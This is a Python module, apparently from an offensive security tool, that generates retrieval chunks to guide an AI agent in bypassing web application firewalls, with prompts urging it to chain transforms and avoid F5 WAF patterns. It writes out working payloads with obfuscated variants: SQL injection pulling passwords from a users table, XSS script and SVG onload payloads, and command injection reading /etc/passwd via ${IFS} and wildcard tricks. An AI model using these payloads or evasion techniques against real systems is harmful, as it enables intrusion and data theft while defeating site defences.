"""
WAF Evasion RAG Ingestor
========================
Génère des chunks pour le RAG à partir des techniques d'évasion.
"""

import logging
from typing import Dict, List, Any, Optional
from pathlib import Path

logger = logging.getLogger(__name__)

# Import transforms info
try:
    from ghost_hunter.core.evasion.transforms import TRANSFORMS, get_available_transforms
    TRANSFORMS_AVAILABLE = True
except ImportError:
    TRANSFORMS_AVAILABLE = False
    TRANSFORMS = {}

# Import WAF patterns
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False


class EvasionIngestor:
    """
    Ingesteur de techniques d'évasion WAF pour RAG.
    
    Génère des chunks contenant:
    - Descriptions des transforms disponibles
    - Exemples d'évasion par type de vuln
    - Patterns WAF à éviter (résumés)
    """
    
    def __init__(self, patterns_path: Optional[Path] = None):
        """
        Initialize ingestor.
        
        Args:
            patterns_path: Chemin vers waf_patterns.yaml
        """
        if patterns_path is None:
            # Correct path relative to this file
            patterns_path = Path(__file__).parent.parent.parent / "evasion" / "data" / "waf_patterns.yaml"
        self.patterns_path = Path(patterns_path)
    
    def generate_transform_chunks(self) -> List[Dict[str, Any]]:
        """
        Génère chunks depuis les transforms disponibles.
        
        Returns:
            Liste de chunks pour RAG
        """
        if not TRANSFORMS_AVAILABLE:
            logger.warning("Transforms not available")
            return []
        
        chunks = []
        
        # Chunk global: liste des transforms
        all_transforms = []
        for name, info in TRANSFORMS.items():
            all_transforms.append(f"- {name}: {info.get('description', '')}")
        
        chunks.append({
            "content": f"""# WAF Evasion Transforms

Available transforms for bypassing WAF detection:

{chr(10).join(all_transforms)}

Use these transforms when WAF blocks payloads. Chain multiple transforms for better evasion.
""",
            "metadata": {
                "source": "evasion_transforms",
                "type": "overview",
                "vuln_types": ["sqli", "xss", "cmdi", "ssti"]
            }
        })
        
        # Chunks par type de vuln
        vuln_types = ["sqli", "xss", "cmdi", "ssti"]
        for vuln_type in vuln_types:
            available = get_available_transforms(vuln_type) if TRANSFORMS_AVAILABLE else []
            if not available:
                continue
            
            # Détails des transforms pour ce type
            details = []
            for name in available:
                info = TRANSFORMS.get(name, {})
                desc = info.get("description", "")
                details.append(f"### {name}\n{desc}\n")
            
            chunks.append({
                "content": f"""# {vuln_type.upper()} WAF Evasion Techniques

Transforms available for {vuln_type.upper()} payload evasion:

{chr(10).join(details)}

## Usage
When WAF blocks your {vuln_type.upper()} payload, try these transforms in order.
Combine multiple transforms for stronger evasion.
""",
                "metadata": {
                    "source": "evasion_transforms",
                    "type": "vuln_specific",
                    "vuln_type": vuln_type,
                    "vuln_types": [vuln_type]
                }
            })
        
        # Chunk d'exemples
        examples = self._generate_examples()
        if examples:
            chunks.append({
                "content": f"""# WAF Evasion Examples

{examples}
""",
                "metadata": {
                    "source": "evasion_examples",
                    "type": "examples",
                    "vuln_types": ["sqli", "xss", "cmdi"]
                }
            })
        
        return chunks
    
    def _generate_examples(self) -> str:
        """Génère exemples d'évasion."""
        examples = """
## SQLi Evasion Examples

Original: `' UNION SELECT password FROM users--`

Transforms applied:
1. case_swap: `' uNiOn SeLeCt password FROM users--`
2. inline_comment: `' UN/**/ION SEL/**/ECT password FROM users--`
3. url_encode: `%27%20UNION%20SELECT%20password%20FROM%20users--`

## XSS Evasion Examples

Original: `<script>alert(1)</script>`

Transforms applied:
1. tag_case_mix: `<ScRiPt>alert(1)</ScRiPt>`
2. svg_payload: `<svg/onload=alert(1)>`
3. null_bytes: `<scr%00ipt>alert(1)</scr%00ipt>`

## CMDi Evasion Examples

Original: `; cat /etc/passwd`

Transforms applied:
1. ifs_sub: `;${IFS}cat${IFS}/etc/passwd`
2. variable_sub: `; c${x}at /etc/passwd`
3. wildcard: `; /???/c?t /etc/passwd`
"""
        return examples.strip()
    
    def generate_waf_pattern_chunks(
        self,
        max_patterns: int = 100
    ) -> List[Dict[str, Any]]:
        """
        Génère chunks depuis patterns WAF.
        
        Args:
            max_patterns: Nombre max de patterns à inclure
            
        Returns:
            Liste de chunks
        """
        if not YAML_AVAILABLE:
            return []
        
        if not self.patterns_path.exists():
            logger.warning(f"Patterns file not found: {self.patterns_path}")
            return []
        
        try:
            with open(self.patterns_path) as f:
                data = yaml.safe_load(f)
        except Exception as e:
            logger.error(f"Failed to load patterns: {e}")
            return []
        
        patterns = data.get("patterns", [])
        if not patterns:
            return []
        
        chunks = []
        
        # Groupe par catégorie
        by_category: Dict[str, List] = {}
        for p in patterns[:max_patterns]:
            cat = p.get("vuln_type", "other")
            if cat not in by_category:
                by_category[cat] = []
            by_category[cat].append(p)
        
        # Un chunk par catégorie
        for cat, cat_patterns in by_category.items():
            # Résumé des patterns
            pattern_strs = [p.get("pattern", "")[:50] for p in cat_patterns[:10]]
            
            chunks.append({
                "content": f"""# F5 WAF Patterns - {cat.upper()}

{len(cat_patterns)} patterns in this category.

Sample blocked patterns (avoid these):
{chr(10).join(f'- `{p}`' for p in pattern_strs)}

When testing {cat.upper()} vulnerabilities, be aware that F5 WAF has extensive detection.
Use evasion transforms to bypass detection.
""",
                "metadata": {
                    "source": "f5_waf_patterns",
                    "type": "waf_patterns",
                    "vuln_type": cat,
                    "pattern_count": len(cat_patterns)
                }
            })
        
        return chunks
    
    def get_all_chunks(self, include_waf_patterns: bool = True) -> List[Dict[str, Any]]:
        """
        Retourne tous les chunks pour ingestion RAG.
        
        Args:
            include_waf_patterns: Inclure les patterns WAF
            
        Returns:
            Liste de tous les chunks
        """
        chunks = self.generate_transform_chunks()
        
        if include_waf_patterns:
            chunks.extend(self.generate_waf_pattern_chunks())
        
        return chunks
